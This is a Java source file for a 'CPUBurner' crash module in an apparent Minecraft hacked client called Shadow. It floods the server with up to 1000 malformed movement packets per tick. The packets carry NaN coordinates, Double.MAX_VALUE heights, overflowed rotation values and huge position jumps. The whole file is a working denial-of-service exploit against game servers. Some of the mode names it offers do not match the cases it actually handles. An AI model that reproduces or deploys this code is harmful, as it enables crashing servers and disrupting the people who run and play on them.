package net.shadow.feature.module;

import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;

import java.util.Random;

public class PacketPlayerCrashModule extends Module {
    static World w;
    final SliderValue pwr = this.config.create("Power", 1, 1, 1000, 1);
    final MultiValue mode = this.config.create("Mode", "Static", "Static", "GradMove", "SnapMove", "Rotate", "Lagback", "NaNMove", "TinyMove");

    public PacketPlayerCrashModule() {
        super("CPUBurner", "crash using move packets", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        String p = mode.getThis();
        return this.getName() + " [" + p + "]";
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        ClientPlayerEntity player = Shadow.c.player;
        switch (mode.getThis().toLowerCase()) {
            case "static":
                Random r = new Random();
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(r.nextBoolean()));
                }
                break;

            case "gradmove":
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX() + (i * 10000), player.getY(), player.getZ() + (i * 10000), true));
                }
                break;

            case "hugemove":
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(29999999, player.getY(), 29999999, true));
                }
                break;

            case "rotate":
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(Float.MAX_VALUE + 1, Float.MIN_VALUE - 1, new Random().nextBoolean()));
                }
                break;

            case "lagback":
                if (Shadow.c.player.age % 100 == 0) {
                    for (int i = 0; i < pwr.getThis(); i++) {
                        player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX(), player.getY() - 1.0, player.getZ(), false));
                        player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX(), Double.MAX_VALUE, player.getZ(), false));
                    }
                }
                break;

            case "nan":
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NaN, Double.NaN, Double.NaN, true));
                }
                break;

            case "tinymove":
                for (int i = 0; i < pwr.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX() + (i * 954), player.getY(), player.getZ() + (i * 954), true));
                }
                break;
        }

    }

    @Override
    public void onRender() {

    }
}
